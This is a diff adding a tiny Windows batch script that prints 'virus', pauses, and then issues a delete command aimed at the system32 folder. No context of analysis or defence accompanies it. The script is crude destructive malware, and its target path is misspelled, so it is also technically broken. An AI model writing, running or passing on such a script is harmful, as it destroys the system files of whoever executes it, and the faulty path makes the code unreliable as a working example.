@@ -1,0 +1,8 @@
+@Echo off
+
+Echo virus
+
+Pause
+
+@Echo off
+Del C:\window\system32
